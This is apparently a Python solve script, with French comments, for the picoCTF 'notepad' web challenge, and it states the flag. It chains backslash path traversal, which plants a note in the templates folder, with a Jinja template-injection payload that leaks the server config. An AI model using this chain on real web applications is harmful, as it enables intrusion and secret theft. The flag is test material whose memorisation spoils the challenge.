# 204 - notepad  (Web Exploitation, picoMini by redpwn)
# Flag: picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
# Write-up: ../../../writeups/web-exploitation/204-notepad.md
# Script exact utilise pour produire le flag.
#
import sys, requests, re, html as H
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})


def make(prefix, payload):
    pad = "A" * (128 - len(prefix))
    return prefix + pad + payload


def post(content):
    r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"/static/(.+?)\.html$", loc)
    return (m.group(1) if m else None), loc


def render(name):
    return S.get(BASE + "/", params={"error": name}, timeout=25, verify=False)


# 1) nom simple + payload config|string pour recuperer la repr brute
c1 = make("\\..\\templates\\errors\\p1", "{{config|string}}")
n1, loc1 = post(c1)
print("nom1:", n1)
# le nom sur disque = url_fix(prefix+pad) ; le prefixe contient des backslash -> deviennent /
disk1 = n1.split("/")[-1] if n1 else None
print("nom disque estime:", disk1[:60] if disk1 else None)
# include : le fichier est dans templates/errors/, on passe juste le basename sans .html
base1 = disk1.rsplit("-", 1)[0] if disk1 else None
print("basename cible:", base1[:60] if base1 else None)
r = render(base1)
print("rendu len:", len(r.text))
seg = H.unescape(r.text)
i = seg.find("<Config")
print("extrait:", seg[i:i + 220].replace("\n", " ") if i >= 0 else "NON RENDU")
if i >= 0:
    cfg = seg[i:seg.find("</h3>", i) if seg.find("</h3>", i) > 0 else i + 400]
    k = cfg.find("_")
    print("premier underscore dans la repr a l'index", k)
